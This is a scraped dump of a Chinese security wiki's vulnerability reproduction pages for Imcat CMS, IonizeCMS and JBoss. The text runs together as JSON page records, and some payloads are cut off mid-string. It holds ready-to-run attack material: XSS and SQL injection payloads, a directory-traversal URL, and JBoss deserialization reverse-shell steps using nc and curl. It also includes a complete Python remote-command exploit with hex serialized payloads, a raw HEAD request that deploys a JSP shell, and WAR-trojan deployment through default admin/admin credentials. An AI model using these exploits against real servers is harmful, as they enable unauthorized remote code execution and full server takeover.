敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。攻击者可借助dev.php?tools-ipaddr&api=Pcoln&uip= URI利用该漏洞泄露完整路径。 二、漏洞影响 imcat 4.4 三、复现过程 如果您尚未安装相关的插件，则可以访问http://www.0-sec.org/dev.php?tools-ipaddr&api=Pcoln&uip=137.36.58.213。错误获取绝对路径信息。 Imcat4.4敏感信息泄露/media/rId24.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:55 "},"Web安全/Imcat/ （CVE-2018-20607）Imcat 4.4 敏感信息泄露/ （CVE-2018-20607）Imcat 4.4 敏感信息泄露 .html":{"url":"Web安全/Imcat/ （CVE-2018-20607）Imcat 4.4 敏感信息泄露/ （CVE-2018-20607）Imcat 4.4 敏感信息泄露 .html","title":" （CVE-2018-20607）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20607）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/binfo.php URI利用该漏洞获取敏感的调试信息。 二、漏洞影响 imcat 4.4 三、复现过程 `http://www.0-sec.org/root/tools/adbug/binfo.php` Imcat4.4敏感信息泄露/media/rId24.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:56 "},"Web安全/Imcat/ （CVE-2018-20608）Imcat 4.4 敏感信息泄露/ （CVE-2018-20608）Imcat 4.4 敏感信息泄露 .html":{"url":"Web安全/Imcat/ （CVE-2018-20608）Imcat 4.4 敏感信息泄露/ （CVE-2018-20608）Imcat 4.4 敏感信息泄露 .html","title":" （CVE-2018-20608）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20608）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/binfo.php?phpinfo1 URI利用该漏洞获取信息。 二、漏洞影响 imcat 4.4 三、复现过程 http://www.0-sec.org/root/tools/adbug/binfo.php?phpinfo1 Imcat4.4敏感信息泄露/media/rId24.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:56 "},"Web安全/Imcat/ （CVE-2018-20609）Imcat 4.4 敏感信息泄露/ （CVE-2018-20609）Imcat 4.4 敏感信息泄露 .html":{"url":"Web安全/Imcat/ （CVE-2018-20609）Imcat 4.4 敏感信息泄露/ （CVE-2018-20609）Imcat 4.4 敏感信息泄露 .html","title":" （CVE-2018-20609）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20609）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可借助root/tools/adbug/check.php URI利用该漏洞获取敏感的配置信息。 二、漏洞影响 imcat 4.4 三、复现过程 http://www.0-sec.org/root/tools/adbug/check.php Imcat4.4敏感信息泄露/media/rId24.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:57 "},"Web安全/Imcat/ （CVE-2018-20610）Imcat 4.4 敏感信息泄露/ （CVE-2018-20610）Imcat 4.4 敏感信息泄露 .html":{"url":"Web安全/Imcat/ （CVE-2018-20610）Imcat 4.4 敏感信息泄露/ （CVE-2018-20610）Imcat 4.4 敏感信息泄露 .html","title":" （CVE-2018-20610）Imcat 4.4 敏感信息泄露 ","keywords":"","body":"（CVE-2018-20610）Imcat 4.4 敏感信息泄露 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中的root/run/adm.php文件存在目录遍历漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。 二、漏洞影响 imcat 4.4 三、复现过程 先在D盘创建1.txt Imcat4.4敏感信息泄露/media/rId24.png) http://www.0-sec.org/root/run/adm.php?admin-ediy&part=edit&dkey=runs&dsub=&efile=../../1.txt&dialog=1546054963116&lang=cn Imcat4.4敏感信息泄露/media/rId25.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:58 "},"Web安全/Imcat/ （CVE-2018-20611）Imcat 4.4 xss/ （CVE-2018-20611）Imcat 4.4 xss .html":{"url":"Web安全/Imcat/ （CVE-2018-20611）Imcat 4.4 xss/ （CVE-2018-20611）Imcat 4.4 xss .html","title":" （CVE-2018-20611）Imcat 4.4 xss ","keywords":"","body":"（CVE-2018-20611）Imcat 4.4 xss 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本存在跨站脚本漏洞。远程攻击者可通过向root/tools/adbug/binfo.php?cookie URI发送特制的cookie利用该漏洞注入任意的Web脚本或HTML。 二、漏洞影响 imcat 4.4 三、复现过程 将cookie的值修改成 \">alert(1) Imcat4.4xss/media/rId24.png) 然后访问 http://www.0-sec.org/root/tools/adbug/binfo.php?cookie` Imcat4.4xss/media/rId25.png) 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:58 "},"Web安全/Imcat/ Imcatcms 4.2 后台文件包含getshell/ Imcatcms 4.2 后台文件包含getshell .html":{"url":"Web安全/Imcat/ Imcatcms 4.2 后台文件包含getshell/ Imcatcms 4.2 后台文件包含getshell .html","title":" Imcatcms 4.2 后台文件包含getshell ","keywords":"","body":"Imcat 4.2 后台文件包含getshell 一、漏洞简介 Imcat cms（贴心猫）4.2 存在一个sql shell的功能上，通过这个sql shell功能也是可以直接getshell的，但是当mysql版本过高的时候，默认有些权限是禁止的，不好弄，不过在这个功能中存在本地文件包含， 所以还可以通过文件包含来进行getshell。 二、漏洞影响 Imcat 4.2 三、复现过程 漏洞分析 找到相应的sql shell功能对应的代码，存在问题的参数是$part，从代码中可以看到$part参数直接传入到include进行文件包含的，虽有两个if判断，但是这很容易就可进行绕过了进入文件包含语句中， 所以只要跟踪的$part参数的传入即可。 跟踪req()函数 继续跟进 最后跟进到这里，其实就是通过get/post等其他方式接收就好，而且并没有进行任何的过滤 漏洞复现 写好的图片格式的shell 找到上传文件的功能，这个在后台中肯定很多可以上传功能，比如上传图片的地方，并获取返回的地址。 然后就可以进入到sql shell的地方中随意执行sql语句就好 抓包，因为默认是没有$part这个参数的传入的，需要自行添加，然后指定到图片的文件地址即可。 备注：ins.dbsql 这个是用来的绕过两个if判断进入到if代码块中的。 参考链接 https://www.t00ls.net/thread-55176-1-1.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:52 "},"Web安全/Imcat/（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞/（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞 .html":{"url":"Web安全/Imcat/（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞/（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞 .html","title":"（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞 ","keywords":"","body":"（CVE-2018-20605）Imcat 4.4 任意代码执行漏洞 一、漏洞简介 imcat是一套基于PHP的开源建站系统。 imcat 4.4版本中存在安全漏洞。远程攻击者可通过使用root/run/adm.php文件修改boot/bootskip.php文件利用该漏洞执行任意的PHP代码。 二、漏洞影响 imcat 4.4 三、复现过程 可以直接修改php文件，而不会限制用户输入。 参考链接 https://github.com/AvaterXXX/CVEs/blob/master/imcat.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:55 "},"Web安全/IonizeCMS/（CVE-2017-5961）IonizeCMS xss/（CVE-2017-5961）IonizeCMS xss.html":{"url":"Web安全/IonizeCMS/（CVE-2017-5961）IonizeCMS xss/（CVE-2017-5961）IonizeCMS xss.html","title":"（CVE-2017-5961）IonizeCMS xss","keywords":"","body":"（CVE-2017-5961）IonizeCMS xss 一、漏洞简介 该漏洞源于在'path'HTTP GET参数传递到'ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php'URL时，程序没有充分地过滤此参数中用户提交的数据。攻击者可利用该漏洞在浏览器中执行任意的HTML和脚本代码。 二、漏洞影响 \\ 三、复现过程 http://0-sec.org/testcmsofgithub/ionize-master/ionize-master/themes/admin/javascript/tinymce/jscripts/tiny_mce/plugins/codemirror/dialog.php?path=%22%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cscript%20%2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:00 "},"Web安全/IonizeCMS/IonizeCMS sql注入/IonizeCMS sql注入.html":{"url":"Web安全/IonizeCMS/IonizeCMS sql注入/IonizeCMS sql注入.html","title":"IonizeCMS sql注入","keywords":"","body":"IonizeCMS sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 伪造HTTP头注入 在抓包哇： X-Forwarded-Host: 'and(select 1 from(select count(*),concat((select concat(0x5e5e5e,version(),0x5e5e5e) from informa Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:53:59 "},"Web安全/Jboss/反序列化漏洞/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞.html":{"url":"Web安全/Jboss/反序列化漏洞/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞.html","title":"（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞","keywords":"","body":"（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 win7一台，ip为172.26.1.151（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.151:8080/invoker/EJBInvokerServle 返回如图（图片是CVE-2015-7501的图片。差不多就是这个意思。凑活看哈~），说明接口开发，存在反序列化漏洞 JBossEJBInvokerServle反序列化漏洞/media/rId24.png) 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 继续执行命令: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.151:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser JBossEJBInvokerServle反序列化漏洞/media/rId26.png) 打开nc界面，发现shell已经弹回来了 JBossEJBInvokerServle反序列化漏洞/media/rId27.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:00 "},"Web安全/Jboss/反序列化漏洞/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞.html":{"url":"Web安全/Jboss/反序列化漏洞/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞.html","title":"（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞","keywords":"","body":"（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞 一、漏洞简介 由于JBoss中invoker/JMXInvokerServlet路径对外开放，JBoss的jmx组件支持Java反序列化 二、漏洞影响 Red Hat JBoss A-MQ 6.x版本；BPM Suite (BPMS) 6.x版本；BRMS 6.x版本和5.x版本；Data Grid (JDG) 6.x版本；Data Virtualization (JDV) 6.x版本和5.x版本；Enterprise Application Platform 6.x版本，5.x版本和4.3.x版本；Fuse 6.x版本；Fuse Service Works (FSW) 6.x版本；Operations Network (JBoss ON) 3.x版本；Portal 6.x版本；SOA Platform (SOA-P) 5.x版本；Web Server (JWS) 3.x版本；Red Hat OpenShift/xPAAS 3.x版本；Red Hat Subscription Asset Manager 1.3版本。 三、复现过程 win7一台，ip为172.26.1.151（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.151:8080/invoker/JMXInvokerServlet 返回如图，说明接口开发，存在反序列化漏洞 JBossJMXInvokerServlet反序列化漏洞/media/rId25.png) 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 继续执行命令: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.151:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser JBossJMXInvokerServlet反序列化漏洞/media/rId27.png) 打开nc界面，发现shell已经弹回来了 JBossJMXInvokerServlet反序列化漏洞/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:01 "},"Web安全/Jboss/反序列化漏洞/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞.html":{"url":"Web安全/Jboss/反序列化漏洞/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞.html","title":"（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞","keywords":"","body":"（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞 一、漏洞简介 JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。 二、漏洞影响 JBoss 5.x - 6.x 三、复现过程 poc cve-2017-12149_cmd.py #!/usr/bin/python #-*- coding:utf-8 -*- import requests import binascii import sys import re if len(sys.argv)!=2: print('+---------------------------------------------------------------+') print('+ DES: by zhzyker as https://github.com/zhzyker/exphub +') print('+ as https://github.com/1337g/CVE-2017-10271 +') print('+---------------------------------------------------------------+') print('+ USE: python +') print('+ EXP: python cve-2017-12149_cmd.py http://freeerror.org:8080 +') print('+ VER: Jboss AS 5.X +') print('+ Jboss AS 6.X +') print('+---------------------------------------------------------------+') sys.exit() url_in = sys.argv[1] linux_payload_1 = \"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000\" \"7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f\" \"6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279\" \"8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563\" \"743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372\" \"002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170\" \"2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267\" \"2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72\" \"6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374\" \"696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec\" \"287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163\" \"68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78\" \"707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e\" \"732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f\" \"72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f\" \"72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009\" \"69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173\" \"734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63\" \"6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254\" \"72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61\" \"76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176\" \"612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176\" \"612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563\" \"743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43\" \"6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574\" \"2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275\" \"71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00\" \"18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a\" \"fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479\" \"71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74\" \"6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f74\" \"6d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a00\" \"0000017671007e00187371007e00137571007e00180000000174000e52756e436865636b\" \"436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a617661\" \"2e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00\" \"18000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171\" \"007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e\" \"537472696e673badd256e7e91d7b470200007870000000017400\" win_payload_1 = \"aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000\" \"7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f\" \"6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279\" \"8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563\" \"743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372\" \"002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170\" \"2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267\" \"2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72\" \"6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374\" \"696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec\" \"287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163\" \"68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78\" \"707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e\" \"732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f\" \"72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f\" \"72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009\" \"69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173\" \"734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63\" \"6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254\" \"72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61\" \"76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176\" \"612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176\" \"612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563\" \"743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43\" \"6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574\" \"2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275\" \"71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00\" \"18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a\" \"fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479\" \"71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74\" \"6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f63\" \"3a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e73\" \"74616e63657571007e001a000000017671007e00187371007e00137571007e0018000000\" \"0174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a\" \"00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078\" \"707371007e00137571007e0018000000017571007e001a0000000171007e003371007e00\" \"1e7571007e001a0000000171007e00207371007e00137571007e00180000000175720013\" \"5b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001\" \"7400\" payload_2 = \"71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e48617\" \"3684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573\" \"686f6c6478703f4000000000000077080000001000000000787878\" payload_other = \"\" os_type = \"unknown\" def build_command_hex(command): command_exec_hex = \"\".join(\"{:02x}\".format(ord(c)) for c in command) command_len = len(command) command_len_hex = '{:02x}'.format(command_len) command_hex = command_len_hex + command_exec_hex return command_hex def build_payload(target_os, command): global os_type if os_type == \"unknown\": if target_os == \"linux\": payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2) if target_os == \"windows\": payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2) if os_type == \"linux\": payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2) if os_type == \"windows\": payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2) return payload def do_post(payload): payload_url = url_in + \"/invoker/readonly\" result = requests.post(payload_url, payload, verify=False) result_content = str(result.content) return result_content def check_OS(): global os_type payload_linux = build_payload('linux','whoami') payload_win = build_payload('windows','whoami') linux_re = do_post(payload_linux) win_re = do_post(payload_win) if \"[L291919]\" in linux_re: os_type = 'linux' if \"[W291013]\" in win_re: os_type = 'windows' return os_type def run_command(command_in): payload = build_payload(os_type,command_in) result = do_post(payload) result = re.findall ( '](.*?)RunCheckConfig',result, re.DOTALL) if len(result) == 0: result.append(\"command error!\\n\") command_callback = result[0] return command_callback check_OS() if os_type ==\"unknown\": print \"[*] Unknown System\" exit(0) print \"***************************************************** \\n\" \"* Target system is \" + os_type + \" OS * \\n\" \"***************************************************** \\n\" while 1: command_in = raw_input(\"Shell >>> \") if command_in == \"exit\" : exit(0) print run_command(command_in).decode('utf-8') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:04 "},"Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞.html":{"url":"Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞.html","title":"（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞","keywords":"","body":"（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 一、漏洞简介 JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 二、漏洞影响 JBoss AS 4.x及之前版本 三、复现过程 win7一台，ip为172.26.1.127（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.127:8080/jbossmq-httpil/HTTPServerILServlet，如果显示下图，则可能存在漏洞 JBoss4.xJBossMQJMS反序列化漏洞/media/rId25.png) 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: 继续执行命令: javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.127:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser JBoss4.xJBossMQJMS反序列化漏洞/media/rId27.png) 回到nc界面，发现shell已经反弹回来了 JBoss4.xJBossMQJMS反序列化漏洞/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:02 "},"Web安全/Jboss/访问控制不严导致的漏洞/（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell/（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell.html":{"url":"Web安全/Jboss/访问控制不严导致的漏洞/（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell/（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell.html","title":"（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell","keywords":"","body":"（CVE-2007-1036）JBoss JMX Console HtmlAdaptor Getshell 一、漏洞简介 此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中jboss.admin -> DeploymentFileRepository -> store()方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。但是通过实验发现，arg1和arg2可以进行文件的拼接，例如arg1=she，arg2=ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下 二、漏洞影响 全版本 三、复现过程 输入url:http://172.26.1.169:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository,定位到store方法 JBossJMXConsoleHtmlAdaptorGetshell/media/rId25.png) 传入相应的值，即可getshell JBossJMXConsoleHtmlAdaptorGetshell/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:09 "},"Web安全/Jboss/访问控制不严导致的漏洞/（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞/（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞.html":{"url":"Web安全/Jboss/访问控制不严导致的漏洞/（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞/（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞.html","title":"（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞","keywords":"","body":"（CVE-2010-0738）JBoss JMX控制台安全验证绕过漏洞 一、漏洞简介 这个漏洞利用方法跟CVE-2007-1036一样，不过这个是绕过了get和post传输限制，利用head传输方式发送payload 二、漏洞影响 jboss4.2.0 and jboss 4.3.0 三、复现过程 因为跟上个漏洞利用差不多，只不过用了head传输方式，我这里就直接贴payload了 HEAD /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=6&arg0=..%2Fjmx-console.war%2F&arg1=hax0rwin&arg2=.jsp&arg3=&arg4=True HTTP/1.1 Host: hostx:portx User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Proxy-Connection: keep-alive Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:10 "},"Web安全/Jboss/访问控制不严导致的漏洞/JBoss Administration Console 弱口令 Getshell/JBoss Administration Console 弱口令 Getshell.html":{"url":"Web安全/Jboss/访问控制不严导致的漏洞/JBoss Administration Console 弱口令 Getshell/JBoss Administration Console 弱口令 Getshell.html","title":"JBoss Administration Console 弱口令 Getshell","keywords":"","body":"JBoss Administration Console 弱口令 Getshell 一、漏洞简介 Administration Console 存在默认密码 admin admin 我们可以登录到后台部署war包getshell 二、漏洞影响 全版本 三、复现过程 1、点击Administration console 2、输入弱口令 admin admin 进去 3、点击Web application ,然后点击右上角的add 4、把文件传上去即可getshell Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:05 "},"Web安全/Jboss/访问控制不严导致的漏洞/JBoss JMX Console未授权访问Getshell/JBoss JMX Console未授权访问Getshell.html":{"url":"Web安全/Jboss/访问控制不严导致的漏洞/JBoss JMX Console未授权访问Getshell/JBoss JMX Console未授权访问Getshell.html","title":"JBoss JMX Console未授权访问Getshell","keywords":"","body":"JBoss JMX Console未授权访问Getshell 一、漏洞简介 二、漏洞影响 全版本 三、复现过程 先输入http://172.26.1.167:8080/jmx-console/null-console/进入到页面 先点击jboss.system,然后点击service=MainDeployer 创建一个war包 先准备好一个jsp的木马,然后打开cmd创建,输入命令:jar -cvf zfsn.war(你要创建war的名字，可随意填) zfsn. jsp 我们找到methodIndex为17 or 19的deploy，把远程的war包填入进去，进行远程war包的部署 部署完成之后,我们的木马地址为http://172.26.1.167/zfsn/zfsn.jsp Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:08 